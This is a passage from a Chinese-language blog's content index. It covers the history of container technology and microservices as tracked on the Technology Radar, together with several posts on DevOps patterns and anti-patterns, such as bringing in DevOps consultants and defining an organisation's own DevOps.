Kubernetes。此外还有基于 Apache Mesos 构建的 Mesosphare 和 Rancher 这样的轻量级竞争对手。\n从它们在技术雷达所处的位置，就可以看出其发展趋势，它们都于 2015 年 11 月进入 “评估” 区域。\nKubernetes 于 2016年 4月 从 “评估” 升入 “试验” 区域，并于 2017 年 11 月正式进入 “采纳” 区域。4 个月后从 CNCF 毕业。 Rancher 于 2016 年 11 月进入 “试验” 区域后止步于此。 Mesosphere DCOS 则一直处于 “评估” 区域。 然而，作为 Docker 原生方案的 Docker Swarm 则从未出现在技术雷达上。\n容器技术 3.0：围绕微服务构建生态 #当 Kubernetes 赢得了容器战争之后，所有的容器厂商俯首称臣。各大厂商在保留了自己的容器编排方案后，纷纷宣布对 Kubernetes 的支持，包括 Docker 自己。\n观望容器战争的云计算厂商最后来摘取获得经过市场淘汰后的果实。就像我们上篇讲的，云计算厂商也纷纷加入到了 Kubernetes 即服务(Kubernetes As A Service)的角逐中来。\n这让 Linux 基金会看到了商机。借着 Kubernetes 的东风，Linux 基金会开始琢磨围绕着 Kubernetes 构建出一个生态。为了避免被单一厂商劫持（Docker 曾经为了挤兑无法收购的竞争对手 ，强推自己的 Swarm 和 Docker EE 也发布了很多其它平台不兼容的版本），Linux 基金会在其旗下组建了 CNCF (云原生计算基金会)。\n相较于 Apache 基金会，CNCF 更加专注于开源的容器应用。不过，从商业角度上，它抓住了下游用户和上游云计算供应商的痛点，依仗着对 Kubernetes 的控制，筛选了符合其”下游垄断”策略的开源项目。这样做一方面避免了上游云计算服务厂商在同一领域的竞争，另一方面给于了下游用户更少的选择。这个看似空手套白狼的生意一年能够让 CNCF 基金会进账至少 871 万美元(约合5850 万 人民币)。\n如果说容器 1.0 是容器技术的竞争，容器技术 2.0 是编排技术的竞争，3.0 就是容器生态的竞争。CNCF 抓住了微服务这一大卖点。围绕着 Kubernetes 组建了基于 Kubernetes 的微服务生态。\n然而这些项目也不负众望，继 Kubernetes 第一个从 CNCF 孵化毕业后，相关其余的开源项目逐个毕业。而这些开源项目在毕业前就出现在了技术雷达上：Prometheus、Istio、Helm、Jaeger、OpenTracing，Rook\n开源使得产业从厂商垄断（类似于 微软，IBM，Oracle 这样的大型IT厂商）慢慢过渡到行会垄断（类似 CNCF 这种基金会），说明了这个产业的供给在不断加大。而随着免费的内容越来越多，重复性低质量的内容反而会占据很多时间。这样虽然让开源社区集中了注意力“把一件事情做好”，另一方面，利用对社区的劫持消灭了同期的其它竞争对手。\nWindows 容器 #在容器技术的大战中，微软一直是一个独立的存在。眼瞅着 Linux 和虚拟化厂商们干掉了商业 UNIX 厂商。眼看Linux 作为服务器操作系统在不断蚕食 Windows Server的份额。微软也坐不住了，开始加入容器领域。\nWindows Server 最为诟病的就是太大太重，对于运行很多单一服务端应用程序和分布式系统而言过于臃肿。于是微软把图形用户界面和 32 位应用的支持以及远程桌面都移除了。\nWindows Server 因为没有 Window 了，那还叫 Windows 吗？所以，没有 Window 的 Windows Server 就是就成为了 Microsoft Nano Server 。Microsoft Nano Server 就是微软在服务器操作系统领域上的第一个容器化尝试。 2015 年11月Microsoft Nano Server 和 Kubernetes 等编排工具一起出现在了进入技术雷达的 “评估” 区域。\n与基于 Linux 的现代云和容器解决方案不同, 即使是 Windows Server Core 也很重。Microsoft 正在做出反应, 并提供了 Nano server 的第一个预览, 这是一个进一步剥离的 Windows Server 版本, 它丢弃了 GUI 堆栈、32位 win32 支持、本地登录和远程桌面支持, 从而产生了大约 400 MB 的磁盘上大小。早期的预览很难使用, 最终的解决方案将仅限于使用 CoreCLR, 但对于有兴趣运行的公司来说。基于网络的解决方案, 纳米服务器绝对值得看看这个阶段。\n但作为 Windows Server 的小表弟，出道之初并没有那么顺利。相较于 Linux，Microsoft Nano Server 还是太大了。于是，微软基于 Docker 推出了自己的容器技术，Windows Containers。Windows Containers 出现在了 2017 年11月的技术雷达上：\n微软正在用 Windows 容器在容器空间中迎头赶上。在编写本报告时, Microsoft 提供了两个 Windows 操作系统映像作为 Docker 容器, 即 Windows Server 2016 Server Core 和 Windows Server 2016 Nano Server。尽管 Windows 容器还有改进的余地, 例如, 减少了较大的镜像大小, 并丰富了生态系统的支持和文档, 但我们的团队已经开始在其他容器一直在工作的情况下使用它们成功, 例如：构建代理（Build Agent）。\n容器技术作为一种轻量级的操作系统隔离和应用程序发布手段，带来了很大的便利性。它让我们能够将复杂的内容通过简单的方式封装起来，从而进一步降低复杂性，特别是对大型应用程序的解耦，这就推动了微服务技术的进一步发展。\n下面是 Docker 相关条目的发展历程一览图。实线为同一条目变动，虚线为相关不同条目变动：\n相关条目：容器安全扫描，Docker，用 TDD 开发容器，Rancher，Kubernetes，Mesosphere DC/OS，Apache Mesos，Prometheus、Istio、Helm、Jaeger、OpenTracing，Rook\n从演进式架构到微服务 #可以说，微服务是 DevOps 所有实践发展的一个必然结果。它不光是一种应用架构，而是包含了多年来敏捷、DevOps、云计算、容器等技术实践的综合应用。\n在以 ESB 为基础的大规模企业级应用出现之前，企业级应用软件的开发规模相对较小，大部分都是基于现有软件包产品的二次定制。采用敏捷的方式来交付这些应用是可控的。然而随着 ESB 将企业级应用的信息孤岛集成起来。敏捷软件开发似乎就显得力不从心了。\n演进式架构在 2010 年第一期技术雷达就被提出来。在敏捷软件开发实践开始应用于大规模应用程序的案例中。”架构”和“变化”出现了矛盾。如何让包含了“不轻易改变的决定”的架构和“拥抱变化”的敏捷共处，于是有了演进式架构：\n我们帮助我们的许多客户调整企业软件体系结构实践, 以适应敏捷软件交付方法。在过去的一年里, 我们看到人们对进化企业架构以及面向服务的架构如何塑造企业单位之间的界限越来越感兴趣。企业架构的进化方法的价值在于创建重量更轻的系统, 从而简化不同部件之间的集成。通过采用这种方法和将 web 作为企业应用程序平台（Web as Enterprise Platform）的概念, 我们降低了应用程序体系结构的总体复杂性, 提高了质量和可扩展性, 并降低了开发成本。\n2010 年 8 月演进式架构进入了”试验”区域，但在2011年1月的技术雷达上更新了对它的评价：\n敏捷软件开发的一个原则是”最后责任时刻”的概念。这一概念适用于架构设计, 它在传统架构师中引起了争议。我们相信, 只要有适当阐述的原则和适当的测试套件, 架构就可以不断发展, 以满足系统不断变化的需求, 从而在不影响完整性的情况下, 在最后一个负责任的时刻做出体系结构决策系统的。我们将这种方法称为进化体系结构, 因为我们允许体系结构随着时间的推移而演变, 始终尊重体系结构的指导原则。\n半年后，2011年6月，演进式架构进入了”采用”区域，技术雷达再次更新了评价：\n与传统的前期、重量级企业架构设计不同, 我们建议采用演进式架构。它提供了企业架构的好处, 而没有尝试准确预测未来所造成的问题。演进式架构不应该猜测组件将如何重用, 而是支持适应性, 使用适当的抽象、数据库迁移、测试套件、持续集成和重构来获取系统中发生的重用。应尽早确定系统的驱动技术要求, 以确保在后续设计和实现中正确处理这些要求。我们主张将决定推迟到”最后责任时刻”, 这实际上可能是一些决定的先行。\n在这些概念不断变化的过程中，不断有方法论、实践和工具被提出。在演进式架构的思想影响下，诞生了新的实践 —— 微服务。微服务的出现，让演进式架构有了第一个实例化的例子。\n微服务 1.0：轻量级 SOA #在技术雷达里，微服务是以”Micro-services”而非”Microservices”出现的。在技术雷达的角度中，微服务仍然是 SOA 的一种轻量化的实现方式。在 2012 年 3月的技术雷达中，微服务首先出现在了技术雷达的“评估”区域：\n微服务通常是脱离应用容器部署或使用嵌入式 HTTP 服务器部署, 它是对传统的大型技术服务的一种迁移。这种方法通过增加运维复杂性而提升系统的可维护性。这些缺点通常使用基础设施自动化和持续部署技术来解决。总的来说, 微服务是管理技术债务和处理不同伸缩特征的有效方法, 尤其是在围绕业务能力构建的面向服务的体系结构中部署时。\n这里需要划几个重点：\n微服务脱离应用容器部署或者使用嵌入式 HTTP 服务器。这一年，Docker 还没有出现。这里的容器指的是 WebSphere，WebLogic 这样的容器。嵌入式 HTTP 服务器指的是 Jetty、Tomcat 或者 DropWizard 这样的轻量级选择。这样代码库可以自部署，而不是通过应用容器部署。 微服务是一种内部复杂度向外部的转化：通过把应用隔离到不同的进程中，可以缩小变更的影响范围。通过将内部复杂性转化成外部复杂性从而使应用更易维护。而外部复杂性就交给自动化的基础设施管理。 微服务提升了维护的复杂性和难度。如果没有 DevOps 组织，服务之间的 应用的风险就由开发转嫁给了维护。不过，作为Ops 可以通过自动化和持续部署/蓝绿发布来解决。 微服务便于管理技术债务，可以做到部分的按需伸缩。 微服务是围绕业务能力的 SOA 架构。 总的来说，微服务在那个时期就是采用轻量级技术来围绕业务实施 SOA。然而，这样的实践慢慢的形成了一种成熟的模式，并慢慢推广开来。在2012年10月的技术雷达，微服务就进入了”试验”区域，而到了 2014 年 1 月。技术雷达更新了对微服务的描述：\n我们看到, 无论是在 ThoughtWorks 还是在更广泛的社区, 微服务作为分布式系统设计技术的采用都在上升。DropWizard 程序等框架和声明性初始化等实践表明技术和工具的成熟。避免采用通常的单体应用办法，微服务更倾向于在必要的情况下替换而非修改局部应用系统。这对应用系统的总体成本具有重要的积极影响。我们认为, 这会在中长期有着巨大的影响, 特别是大部分应用的重写周期都在 2 – 5 年。\n随着 DropWizard 开始在 Java 用户群展露头角，各个其它语言社区也出现了自己的轻量级 API 框架。Ruby 社区率先出现 了 Sinatra 框架，它的轻量级语法深刻的影响了未来各语言的微服务框架。例如而 .Net 社区中出现了Nancy。Python 社区出现了 Flask 。\n微服务 2.0：结合基础设施的全面架构设计 #单一的轻量级服务端框架并不能端到端的解决服务消费者和服务提供者的所有问题。随着应用慢慢的开始被拆分成了微服务，基础设施的管理变成了一个新的问题。在分布式系统环境下，基础设施的范围要比虚拟机时代广泛的多。复杂的基础设施和即代码的集中式管理成为了另一个“单体”应用。于是有了前文介绍的去中心化的 Chef 和 Puppet 实践。让基础设施代码作为应用代码库的一个部分，这样，就可以构建出一个“自部署”的应用。\n这样的想法推动了 Ansible 和 Vagrant 的流行，并伴随着持续交付的实践。我们可以通过构建可执行的虚拟机镜像将应用切分成不同的虚拟机来运行。在那个时期，一个大型应用能够被拆分到多个虚拟机中自动化管理已经很先进了。\n然而，Docker 的出现，将这一系列最佳实践固化成了一个完成的应用程序生命周期：开发人员通过构建 Docker 镜像在本地开发，然后通过持续交付流水线构建成版本化镜像。容器平台按需拉取镜像并直接运行，从开发环境到生产环境几乎没有差别。运维平台只要能够通过虚拟化资源使容器能够轻易的运行，就打通了端到端的最短距离。\n正如上文所述“容器内”和“容器外”被清晰的隔离开，无论从组织上还是架构上，都适应了这套模型。此外，基础设施的关注点分离变成了两个部分：应用程序的运行时管理和应用间的通信。\n刚开始的时候，Docker 看起来更像是一个“轻量级的虚拟机”——我们通过镜像构建出一个运行实体。但随着应用程序的责任分离，Docker 就更像是一个“重量级的进程”。我们如果把容器按责任分离，就可以把容器看做是一个个通过 API 暴露的资源。这样，我们就可以采用云计算的资源编排的方式来处理应用之间的问题。恰逢 Docker 的容器间网络和编排工具的成熟，使我们有了更多的容器编排方案可以选择。\n刚开始的时候，微服务之间还是简单的 HTTP 调用。我们可以通过 Nginx 作为 API 网关。随着服务变得复杂，对于 API 网关的要求就越来越多，于是就有了单一的 API 网关方案，简化了 API 管理。\n如何让网关知道每个服务的情况呢？一方面，API 网关需要知道服务的存活情况。另一方面，服务自身要能够主动汇报自身的状态，于是 Consul 这样的服务注册发现解决方案就逐渐流行起来。\n同时，日志收集和监控要集成到每个服务中去，从管理的角度也要能聚合所有的日志和监控，于是有了OpenTracing 这样的解决方案。\n随着微服务架构体系越来越复杂，这些零散的工具和应用开发框架的集成变成了新的问题。这样的问题最早出现在 Java 社区 —— 因为大部分大型应用仍然是基于 Java EE 的。于是 Spring 推出了Spring Cloud —— 坊间称之为 Spring 微服务全家桶，它包含了所有微服务端到端的组件。虽然Spring Boot 出现的比较晚，但凭借着 Spring 在 Java 社区的号召力使其迅速超过 DropWizard，Jersey 等方案脱颖而出。成为了目前 Java 社区的 微服务构建首选。\n然而，部署实例里仍然存在着安全、监控、日志收集这样的基础设施功能，就出现了”野心过大的 API 网关“。这个问题出现在了 2015 年11 月份的技术雷达上：\n我们常见的抱怨之一是将业务智能推入中间件, 从而产生了具有运行关键应用程序逻辑雄心的应用程序服务器和企业服务总线。这些都需要在不适合这一目的的环境中进行复杂的编程。我们看到这种疾病的重新出现令人担忧, 因为 API 网关产品常常野心过大。API 网关可以在处理一些一般问题 (例如, 身份验证和速率限制) 时提供实用程序, 但任何域智能 (如数据转换或规则处理) 都应驻留在应用程序或服务中, 这些应用程序或服务可以由与他们支持的领域密切合作的产品团队。\n不光 API 会出现这样的问题。替代传统消息队列的 Kafka 也会面临同样的问题，虽然用了新技术，但貌似又回到了集中化的老路上去。这些都违背了微服务的”自治性原则”。\n于是，就有人想，能不能通过容器技术，将代码无关的一类安全、反向代理、日志等拆散到各个服务实体上去。在单个服务的内部实现关注点分离——业务代码和非业务组件隔离。比如，采用边车模式处理端点的安全。这样的方式十分有效的化解了集中服务组件的负载和依赖。于是这个模式就复制扩大，变成了服务网格(Service Mesh)。服务网格出现在 2017 年底的技术雷达上：\n随着大型组织过渡到拥有和运营自己微服务的自主团队, 它们如何在不依赖集中式托管基础结构的情况下确保这些服务之间必要的一致性和兼容性？为了高效地协同工作, 即使是自主的微服务也需要与某些组织标准保持一致。服务网格提供一致的发现、安全性、跟踪、监视和故障处理, 而不需要共享资产 (如 API 网关或 ESB)。典型的实现涉及在每个服务进程旁边部署的轻量级反向代理进程, 可能是在一个单独的容器中。这些代理与服务注册表、标识提供程序、日志聚合器等进行通信。服务互操作性和可观测性是通过此代理的共享实现获得的, 而不是通过共享运行时实例获得的。一段时间以来, 我们一直主张采用分散的微服务管理方法, 并很高兴看到这种一致的模式出现。诸如 linkerd 和 Istio 这样的开源项目将继续成熟, 使服务网格更易于实现。\n时下服务网格成为了微服务架构的热门，但这种模式很明显增大了网络上的开销，但分摊了服务治理的压力。相对于微服务复杂性而言，这些开销在某种程度上是可以接受的。\n微服务 3.0：无服务器的微服务架构 #从微服务技术的发展历程来看，微服务技术的发展是不断的把业务代码和微服务运行时逐渐剥离的一个过程：让尽可能多的不经常变更的部分沉淀到基础设施里，并通过基础设施即代码管理起来。\n从 DevOps 的角度来看，应用程序在分离业务代码和基础设施的过程中清晰界定了开发和运维之间的职责。开发团队要负责应用程序的业务代码能够跟随业务的变化而演进。而运维团队就要为开发团队提供尽可能透明和可靠的基础设施支持。\n一言以蔽之：开发工程师除了写业务代码，什么都不需要管。\n早在 服务网格之前，后端应用即服务(Backend as service)就已经进入2014年的技术雷达。彼时还是移动端应用爆发的时候。开发人员可以通过这种方式专注于客户端的开发。而到 AWS 推出了 AWS Lambda 和 Amazon APIGateway 后，函数即服务(Function as a service)的理念则标志了无服务器应用架构（Serverless Architecture)的到来。\nServerless 的架构把应用程序的理念推向了一个新的极致。以前的应用程序是需要考虑基础设施状态的：CPU/内存/磁盘是否足够，带宽是否足够，网络是否可靠。而在 Serverless 应用程序的世界里，基础设施层已经解决上述所有的问题，给开发者一个真正无限制的基础设施空间。\n开发者只要考虑的就是设计好各资源之间的事件处理关系，而所有的资源都是通过高可用的基础设施承载。\n在 UNIX 的世界里，一切皆文件。而在 Serverless 应用的世界里，一切皆 API。在 UNIX 的世界里，我们消费流(Stream)，应用程序是对流的处理。而在 Serverless 应用的世界里，我们消费事件(Event)，应用程序是对事件的处理。\n这种思想特别适合基础设施逐渐复杂的微服务，使得微服务的实施更加的轻便。但这也带来了编程模型的转变：函数式编程和面向资源计算渐渐流行了起来。\n从基础设施的角度来看，微服务经历了三代技术：\n第一代微服务是基于虚拟机和物理机的基础设施，将一个难以敏捷交付的大型应用程序通过轻量级分布式系统敏捷化。为了提升可用性，我们要拆分应用的状态以支持水平扩展。\n第二代微服务是基于容器的基础设施，我们通过容器镜像分离了应用程序运行时状态。\n第三代微服务是基于云的”运行时即服务(Runtime as a Service)”的能力，将基础设施和应用程序的所有状态都存储在了云计算平台的高可用资源中。而应用程序本身则作为云计算资源的配置被版本化管理起来。\n这样的思想影响也影响了容器社区，于是基于 Kubernetes 的 KNative 被开发了出来。企业级应用的理念和互联网级应用的理念越来越接近。\n应用微服务的组织问题 #从上述的历史可以看到，微服务是一系列技术和理念不断革新的结果。而微服务这个词掩盖了太多的细节。\n相较于技术和工具的不断发展，采用微服务的组织演进则缓慢的多。一方面是因为在大多数企业中，IT部门仍然不是核心部门，只是所有部门中的“二等公民”。另一方面是康威定律的生效时间会比较长。\n特别是一些成功企业的“微服务”分享，使得那些拥有”落后”应用架构的组织开始嫉妒那些有微服务应用架构的组织。于是，就出现了”微服务嫉妒“的问题，它出现于 2015 年 11月的技术雷达：\n我们仍然相信, 微服务可以为组织提供显著优势, 提高团队自主权和加快变革频率。分布式系统带来的额外复杂性需要额外的成熟度和投资水平。我们感到关切的是, 一些团队在不了解开发、测试和操作的变化的情况下, 纷纷采用微服务。我们的一般建议仍然很简单。避免“微服务嫉妒”, 在匆忙开发更多服务之前, 先从一两个服务开始, 让你的团队有时间调整和理解合适的粒度水平。\n强烈的攀比心态造成了微服务”大跃进”的风潮，这股风潮一直持续到现在。虽然采用的开发技术提升了，然而组织却欠缺基础的能力，使微服务的改造带来了新的问题：\n在现代基于云的系统中, 微服务已经成为一种领先的架构技术, 但我们仍然认为团队在做出这一选择时应该谨慎行事。微服务嫉妒诱惑团队通过拥有大量的服务来使他们的体系结构复杂化, 仅仅因为它是一种时尚的架构选择。Kubernetes 等平台使部署复杂的微服务集变得容易得多, 供应商正在推动他们的解决方案来管理微服务, 这可能会使团队进一步走上这条道路。重要的是要记住, 微服务贸易发展的复杂性是运维的复杂性, 需要一个坚实的基础，例如 自动化测试, 持续交付和 DevOps 文化。\n这就是我经常说的：”眼光到位了，实力没跟上”。\n微服务是一系列基础能力成熟后的必然结果。如果你要在短期内跨越这个阶段，希望采用微服务架构来牵引组织能力的成长，就一定要有心理准备。你可以通过采购技术解决方案的方式一次性解决 3-5 年微服务实施中的技术问题。但组织中碰到的问题则没有容易通过采购技术方案来消化。所以，在微服务的实施过程中，要警惕康威定律的作用，并且尽快让组织里形成 DevOps 的文化。\n除此之外，很多架构师还一直停留在早期的分层架构思考，造成了”分层的微服务架构“：\n微服务体系结构的一个决定性特征是系统组件和服务是围绕业务功能组织的。无论规模大小, 微服务都封装了有意义的功能和信息分组, 以独立交付业务价值。这与早期服务体系结构中根据技术特征组织服务的方法形成鲜明对比。我们观察到一些组织采用了分层微服务体系结构, 这在某些方面是矛盾的。这些组织已回到主要根据技术角色安排服务, 例如, 体验 Api、进程 Api 或系统 Api。技术团队很容易按层分配, 因此交付任何有价值的业务变化都需要多个团队之间缓慢而代价高昂的协调。我们注意这种分层的影响, 并建议主要根据业务能力安排服务和团队。\n因此，架构师需要掌握新的技能，特别是领域驱动设计(Domain-Driven-Design，DDD)以及端口-适配器模式，采用六边形架构来描述微服务架构，就会使你对整个架构的理解更加清晰。\n除了开发、基础设施、架构问题以外。微服务的测试是一个更大的问题。微服务虽然从架构上解耦了应用程序的复杂度，让更少的功能隔离进了更小的发布单元中。这样可以缩小单个部署单元的测试范围，但这无法保证整体的正确性。应用程序并不是一个线性系统，能够通过部分的正确性加总得到整体的正确性。应用程序是一个复杂适应性系统，我们通过简单的组件之间的组合只会使之更加复杂。\n当我我们将复杂性通过技术设施移到了部署单元之外后，就会有更多的集成，因此集成测试的数量会立刻膨胀。如果你是一个前后端分离的团队而不是一个围绕业务的全功能团队，你就需要”消费者驱动的契约测试“来做组织间的协作。\n下面是微服务相关条目的发展历程一览图。实线为同一条目变动，虚线为相关不同条目变动：\n相关条目：演进式架构，Nancy，Consul，OpenTracing ，Spring Cloud ，野心过大的 API 网关，边车模式处理端点的安全，服务网格(Service Mesh)，后端应用即服务(Backend as service)，AWS Lambda， Amazon APIGateway ，无服务器应用架构（Serverless Architecture)，KNative，分层的微服务架构，消费者驱动的契约测试，微服务嫉妒\n","date":"July 21, 2019","permalink":"/blog/2019/2019-07-21-devops-and-techradar-anniversary-docker-and-microservices/","section":"Blogs","summary":"","title":"从技术雷达看 DevOps 的十年——容器技术与微服务"},{"content":"","date":null,"permalink":"/tags/%E6%8A%80%E6%9C%AF%E9%9B%B7%E8%BE%BE/","section":"Tags","summary":"","title":"技术雷达"},{"content":"","date":null,"permalink":"/tags/devops-%E6%A8%A1%E5%BC%8F/","section":"Tags","summary":"","title":"DevOps 模式"},{"content":"很多企业并不是 DevOps 运动的早期玩家。当开始注意到 DevOps 的时候，想快速达到 DevOps 实践领先企业的效果，会引入有经验的 DevOps 顾问进行快速的转型。\n然而，短期的 DevOps 顾问合同如果不能帮助团队构建 DevOps 制度和 DevOps 文化，DevOps 转型的效果将随 DevOps 专家的离开而离开，使团队得到“DevOps 不适用”的错觉。因此，在引入 DevOps 专家顾问的时候，我们一定要明确 请 DevOps 顾问的目的以及 DevOps 顾问留下的东西。\n模式：引入 DevOps 顾问 (Introduce DevOps Consultant) #模式名称：引入 DevOps 顾问 (Introduce DevOps Consultant)\n模式别名：引入 DevOps 专家，引入 DevOps 教练\n模式类别： 策略模式\n风险： 中 - 采用的时候要注意场景和条件，否则会出现反模式。\n价值：中 - 采用该模式产生中期固定的收益，但要持续做才可以获得收益。\n见效时间：快 - 2 周内可看到显著改进。\n说明：\n引入 DevOps 顾问需要注意以下几点： DevOps 顾问要对 DevOps 的历史和来龙去脉有起码的理解。 DevOps 顾问要有不同的转型案例，如果只有一类企业的 DevOps 转型案例，在转型的过程中很容易进入“路径依赖”，认为 DevOps 转型只有一种。所以，DevOps 顾问要问不同案例中的差异的区别。 DevOps 顾问要同时引入管理转型实践和技术实践。缺乏 DevOps 管理实践会导致 DevOps 转型失去方向和效果。缺乏 DevOps 技术实践会让 DevOps 难以落地。 把你的具体问题抛给 DevOps 顾问，让他提出问题和观点。 关注 DevOps 顾问在上述各种描述中对 CLAMS 原则的应用。 DevOps 顾问需要可以和团队“一起做”，而不是“在一边看”。 DevOps 顾问要能给出对于组织的 DevOps 评估，并且根据评估给出能够落地的解决方案。 DevOps 顾问要根据 DevOps 评估的内容，帮助组织构建出 DevOps 文化、技术实践，以及相应的制度。 警惕那些对组织特征、组织痛点和转型范围不提问题的 DevOps 顾问。 相关模式：DevOps 评估，DevOps 转型，DevOps 改进\n相关反模式：招聘 DevOps 专家做转型，DevOps 专家依赖\n相关引用：暂无\n反模式：DevOps 专家依赖 (DevOps expert dependence) #反模式名称：DevOps 专家依赖 (DevOps expert dependence)\n反模式别名：无\n反模式类别： 策略反模式\n不良后果： DevOps 转型好的效果产生反弹和复原。\n常见现象： DevOps 专家在的时候团队表现良好，DevOps 专家离开之后团队表现不佳。\n常见原因：\nDevOps 实践缺乏度量数据来证明其显著有效性。 DevOps 专家所采取的实践没有被当做制度传承下来。 组织内部抵抗 DevOps 转型。 说明：\nDevOps 的 CLAMS 原则中很重要的一点是度量，如果对 DevOps 实践没有有效的度量，则无法证明其有效性。由于新引入的 DevOps 实践会产生一定的成本，这种成本和组织表现如果长期呈现负相关而非正相关则会阻碍 DevOps 实践的落地。\n如果有效的 DevOps 实践没有形成强制的制度，则团队则会因为习惯的原因退回到之前的状态，使 DevOps 转型的效果反弹。同时，很大程度上 DevOps 顾问在转型初期形成的抵触情绪在 DevOps 顾问离开后得以释放。使得团队回到 DevOps 转型之前的状态。\n修正模式：引入 DevOps 顾问，DevOps 度量，建立 DevOps 规范，DevOps 改进模式\n相关反模式：缺乏度量的 DevOps 实践\n相关引用：暂无\n关于 DevOps 模式 #DevOps 模式的索引在 Github 上开源，地址是https://github.com/wizardbyron/devops_patterns\n欢迎通过 issue 和pull request 提交你的建议。\n你可以通过关注我的公众号了解 DevOps 模式和反模式，也可以加入我的付费知识星球“DevOps 模式” 和所有 DevOps 的实践者共同交流，我将在知识星球中定期回答那些最受关注的问题。\n","date":"July 13, 2019","permalink":"/blog/2019/2019-07-13-devops-pattern-introduce-devops-consultant/","section":"Blogs","summary":"","title":"DevOps 模式 - 引入 DevOps 顾问"},{"content":"我今天把 DevOps 模式和反模式做了一个简单的总结。如果全职写，半年可以写完。如果周更，需要两年，我怕自己烂尾，夜长梦多。\n自己开的坑，含着泪也要把它填完。\nDevOps 策略模式 # 模式：定义你的 DevOps 反模式：DevOps 教条主义 反模式：DevOps 复制者 模式：引入 DevOps 顾问 反模式：DevOps 专家依赖 模式：DevOps 评估 模式：DevOps 共识 反模式：片面的 DevOps 理解 模式：定义 DevOps 范围 模式：DevOps 三步工作法 模式：DevOps 团队复制 模式：DevOps 团队改进 模式：DevOps 规范 反模式：缺乏管理约束的 DevOps 规范 反模式：缺乏技术约束的 DevOps 规范 模式：测试计划驱动开发计划 案例-01：每个人自己的 DevOps 案例-02：不同范围下的 DevOps 策略 案例-03：DevOps 团队复制 vs DevOps 团队改进 DevOps 组织模式 # 模式：DevOps 试点团队 模式：DevOps 推广团队 模式：Dev 团队含 Ops 成员 模式：Dev 团队共享 Ops 团队 模式：BAU 团队和特性团队 反模式：职责过多的 DevOps 团队 反模式：全栈工程师 模式：独立的质量控制团队 反模式：屈服于交付压力的质量控制团队 案例-01：屈服于交付压力的质量控制团队 DevOps 管理模式 # 模式：最小可用流程 模式：DevOps 看板 模式：累计流图 模式：四类任务 模式：DevOps 关键指标 模式：定制化 DevOps 度量 反模式：没有度量的DevOps 模式：包含 Ops 的 Scrum 模式：质量内建 模式：质量保证和质量控制 反模式：过程质量 Over 结果质量 模式：DevOps 技能矩阵 模式：测试人员驱动开发人员 案例-01：结合质量控制的质量保证流程 案例-02：交付 QA 和流程 QA DevOps 文化模式 # 模式：DevOps 比学赶超 模式：CLAMS 反思 模式：DevOps 回顾会议 模式：DevOps 大使 模式：反向管理 反模式：DevOps 指挥官 模式：我要做 DevOps 反模式：要我做 DevOps 模式：全员为质量负责 模式：DevOps 培训 反模式：DevOps 速成班 模式：DevOps 分享 反模式：封闭的 DevOps 模式：\u0026ldquo;如何定义\u0026quot;和\u0026quot;如何度量\u0026quot;问题 案例-01：规模化 DevOps 案例-02：正向管理 vs 反向管理 案例-03：通过分享增强自己的 DevOps 能力 DevOps 技术模式 # 模式：持续集成 反模式：持续集成表演 模式：持续部署 模式：基础设施即代码 模式：基础设施流水线 模式：自动化安全扫描 模式：测试驱动开发 反模式：过度自动化的 DevOps 模式：DevOps 平台 反模式：工具化 DevOps 反模式：基于组织映射的 DevOps 平台 模式：DesignOps 模式：混沌工程 模式：环境无关的应用程序 模式：环境相关的应用程序 模式：自部署的应用程序 反模式：知识太多的应用程序 反模式：基础设施依赖的应用程序 模式：12 Factors App 模式：BeyondCorp 模式：3R 企业安全 模式：微服务架构 反模式：微服务嫉妒 反模式：缺乏 DevOps 能力的微服务组织 模式：度量驱动的微服务 反模式：缺乏度量的微服务 模式：Serverless 应用架构 反模式：纳服务架构 案例-01：基于 Serverless 的微服务架构 案例-02：数据库变更流水线 关于 DevOps 模式 #DevOps 模式的索引在 Github 上开源，地址是https://github.com/wizardbyron/devops_patterns\n欢迎通过 issue 和pull request 提交你的建议。\n你可以通过关注我的公众号了解 DevOps 模式和反模式，也可以加入我的付费知识星球“DevOps 模式” 和所有 DevOps 的实践者共同交流，我将在知识星球中定期回答那些最受关注的问题。\n","date":"June 2, 2019","permalink":"/blog/2019/2019-06-03-devops-patterns-index/","section":"Blogs","summary":"","title":"DevOps 模式 - 索引"},{"content":"遗憾的是，很少有人真的关心 “DevOps 是什么”，当然其实也不重要。比 DevOps 是什么来说，更重要的是 “DevOps 能做\u0010什么”。据 John Willis 的说法，DevOps 运动的发起人 Patrick Debois 一直拒绝给 DevOps 下定义是一件了不起的事情。 Patrick Debois 他不希望把 DevOps 据为己有。DevOps 应该属于社区，属于每一个愿意投身于 DevOps 目标的个人和组织。\n由于第一届 DevOpsDays 奠定 DevOps 的基础。组织者 Patrick Debois 作为第一个\u0026quot;官方\u0026quot; DevOps 发言人。第一届 DevOps 的产出内容给未来的 DevOps 发展方向上起到决定性作用。因此，DevOps 模式中的 DevOps 的相关定义均参考Patrick Debios 的博客。\n然而，在我过去经历的不同的 DevOps 转型/改进项目中的经历来看。不同的组织，不同的部门，甚至是同一个部门的人，大家对 DevOps 的理解并不一致。这对 DevOps 长时间在组织内发挥改进作用是不利的。\n模式：定义你的 DevOps (Define Your DevOps) #模式名称：定义你的 DevOps (Define Your DevOps)\n模式别名：定制化 DevOps 定义 (Customize DevOps Definition)\n模式类别： 策略模式\n风险： 中 - 采用的时候要注意场景和条件，否则会出现反模式。\n价值：中 - 采用该模式产生中期固定的收益，但要持续做才可以获得收益。\n见效时间：快 - 2 周内可看到显著改进。\n说明：\n根据组织的需要，在基于对 DevOps 历史和实践的理解上建立对组织发展有益的 DevOps 的定义。DevOps 的定义包括 DevOps 的组织改进范围，DevOps 的度量，DevOps 的实践。在采用 DevOps 实践的过程中，要先取得 DevOps 共识并基于共识采取 DevOps 度量。否则无法确定 DevOps 带来的改进。\n此外，DevOps 的定义会随着组织在的不同阶段而变化。要定期重新定义当前阶段的DevOps 目标，否则会导致\u0026quot;DevOps教条主义\u0026quot; 反模式和\u0026quot; DevOps 复制者\u0026quot;反模式。\nDevOps 的定义要在实施 DevOps 的组织内达成共识。否则会陷入\u0026quot;片面的 DevOps\u0026quot; 反模式。\n相关模式：DevOps 共识，DevOps 范围，建立 DevOps 度量，短期 DevOps 提升\n相关反模式： DevOps 教条主义，DevOps 复制者，片面的 DevOps\n相关引用：\nhttps://en.wikipedia.org/wiki/DevOps\nhttps://youtu.be/o7-IuYS0iSE\nhttp://www.jedi.be/blog/2009/12/22/charting-out-devops-ideas/\nhttp://www.jedi.be/blog/2012/05/12/codifying-devops-area-practices/\n如果不定义适合自己的 DevOps，或者对 DevOps 理解单一。会导致\u0026quot;DevOps 